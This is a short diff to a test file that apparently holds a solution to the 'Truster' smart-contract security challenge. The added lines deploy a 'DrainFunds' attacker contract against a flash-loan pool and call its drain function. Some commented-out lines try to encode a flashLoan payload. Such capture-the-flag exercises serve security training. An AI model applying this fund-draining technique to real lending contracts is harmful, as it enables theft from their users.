@@ -23,6 +23,12 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+      //bytes memory payload = abi.encodeWithSignature("flashLoan(uint256, address, address, bytes)", TOKENS_IN_POOL, player.address, pool.address);
+      const DrainFundsFactory = await ethers.getContractFactory('DrainFunds', player);
+      let drainFunds = await DrainFundsFactory.deploy(pool.address, token.address);
+      await drainFunds.drain();
+      //const payload = abi.encodeWithSignature("flashLoan(uint256,address,address,bytes)", 0, player.address, pool.address, "0x");
+      //await pool.connect(player).flashLoan(0, player.address, drainFunds.address, "0x");
     });
 
     after(async function () {
